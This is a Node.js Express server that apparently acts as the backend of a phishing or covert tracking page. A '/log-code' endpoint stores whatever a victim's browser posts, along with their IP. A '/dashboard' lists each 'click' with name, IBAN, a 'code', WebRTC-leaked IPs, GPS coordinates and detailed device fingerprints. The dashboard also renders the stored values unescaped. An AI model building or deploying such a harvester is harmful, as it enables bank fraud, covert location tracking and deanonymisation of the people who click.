const express=require('express');
const fs=require('fs');
const path=require('path');
const app=express();
app.use(express.json({limit:'1mb'}));
app.use(express.static(__dirname));
const LF=path.join(__dirname,'logs.json');
function sv(e){
let l=[];
if(fs.existsSync(LF)){try{l=JSON.parse(fs.readFileSync(LF,'utf8'));}catch(x){}}
e._at=new Date().toISOString();
l.push(e);
fs.writeFileSync(LF,JSON.stringify(l,null,2));
}
app.post('/log-code',(req,res)=>{
const b=req.body;
b._ip=(req.headers['x-forwarded-for']||req.socket.remoteAddress).split(',')[0].trim();
sv(b);
res.json({ok:1});
});
app.get('/dashboard',(req,res)=>{
let l=[];
if(fs.existsSync(LF)){try{l=JSON.parse(fs.readFileSync(LF,'utf8'));}catch(e){}}
function f(o,k){return o[k]!==undefined?String(o[k]):'—';}
res.type('html').send('<html><head><title>Logs</title><style>'+
'body{font-family:monospace;padding:20px;background:#111;color:#eee}'+
'h1{color:#00d4ff}'+
'.c2{background:#1a1a2e;padding:18px;border-radius:10px;margin:16px 0;border-left:4px solid #1a56db}'+
'.c2 h3{color:#00d4ff;margin:0 0 10px;font-size:15px}'+
'.r{display:grid;grid-template-columns:180px 1fr;gap:2px 12px;font-size:12px;line-height:1.8}'+
'.k{color:#888}.v{color:#eee;word-break:break-all}'+
'.hi{color:#16a34a;font-weight:700}'+
'.loc{color:#f59e0b;font-weight:700}'+
'</style></head><body><h1>Device Logs ('+l.length+')</h1>'+
(l.length===0?'<p>No clicks yet.</p>':l.map(function(o,i){
return '<div class="c2"><h3>Click #'+(i+1)+' — '+f(o,'ts')+'</h3><div class="r">'+
'<span class="k">Name</span><span class="v hi">'+f(o,'name')+'</span>'+
'<span class="k">IBAN</span><span class="v hi">'+f(o,'iban')+'</span>'+
'<span class="k">Code</span><span class="v">'+f(o,'code')+'</span>'+
'<span class="k">IP</span><span class="v hi">'+f(o,'_ip')+'</span>'+
'<span class="k">WebRTC IPs</span><span class="v">'+JSON.stringify(f(o,'wrtc'))+'</span>'+
'<span class="k">GPS</span><span class="v loc">'+f(o,'lat')+','+f(o,'lng')+' ±'+f(o,'acc')+'m</span>'+
'<span class="k">Timezone</span><span class="v">'+f(o,'tz')+' (offset '+f(o,'tzo')+'h)</span>'+
'<span class="k">User Agent</span><span class="v">'+f(o,'ua')+'</span>'+
'<span class="k">Platform</span><span class="v">'+f(o,'plat')+'</span>'+
'<span class="k">CPU Cores</span><span class="v">'+f(o,'cpu')+'</span>'+
'<span class="k">RAM</span><span class="v">'+(f(o,'mem')!=='—'?f(o,'mem')+' GB':'n/a')+'</span>'+
'<span class="k">Touch Points</span><span class="v">'+f(o,'touch')+'</span>'+
'<span class="k">Screen</span><span class="v">'+f(o,'sw')+'x'+f(o,'sh')+' @'+f(o,'pr')+'x ('+f(o,'cd')+'bit)</span>'+
'<span class="k">Orientation</span><span class="v">'+f(o,'so')+'</span>'+
'<span class="k">GPU Vendor</span><span class="v">'+f(o,'guv')+'</span>'+
'<span class="k">GPU Renderer</span><span class="v">'+f(o,'gur')+'</span>'+
'<span class="k">GL Version</span><span class="v">'+f(o,'glv')+'</span>'+
'<span class="k">Canvas FP</span><span class="v">'+f(o,'cfp').substring(0,80)+'...</span>'+
'<span class="k">Fonts</span><span class="v">'+f(o,'fonts')+'</span>'+
'<span class="k">Speech Voices</span><span class="v">'+f(o,'sv')+' — '+f(o,'svl')+'</span>'+
'<span class="k">Battery</span><span class="v">'+(f(o,'btl')!=='—'?Math.round(f(o,'btl')*100)+'%'+(f(o,'btc')==='true'?' (charging)':' (discharging)'):'n/a')+'</span>'+
'<span class="k">Network</span><span class="v">'+f(o,'nt')+' / '+f(o,'ne2')+' / '+f(o,'nd')+'Mbps</span>'+
'<span class="k">Online</span><span class="v">'+f(o,'on')+'</span>'+
'<span class="k">Language</span><span class="v">'+f(o,'lang')+' ('+f(o,'langs')+')</span>'+
'<span class="k">Do Not Track</span><span class="v">'+f(o,'dnt')+'</span>'+
'<span class="k">Cookies</span><span class="v">'+f(o,'ck')+'</span>'+
'<span class="k">Dark Mode</span><span class="v">'+f(o,'dm')+'</span>'+
'<span class="k">Referrer</span><span class="v">'+(f(o,'ref')||'(direct)')+'</span>'+
'<span class="k">Storage</span><span class="v">'+(f(o,'sq')!=='—'?Math.round(f(o,'sq')/1073741824)+'GB / '+Math.round(f(o,'su')/1048576)+'MB':'n/a')+'</span>'+
'<span class="k">JS Heap</span><span class="v">'+(f(o,'jhu')!=='—'?Math.round(f(o,'jhu')/1048576)+'MB / '+Math.round(f(o,'jht')/1048576)+'MB':'n/a')+'</span>'+
'<span class="k">Vendor</span><span class="v">'+f(o,'vend')+'</span>'+
'</div></div>';
}).join(''))+
'</body></html>');
});
app.listen(process.env.PORT||3000,function(){console.log('Running on '+(process.env.PORT||3000));});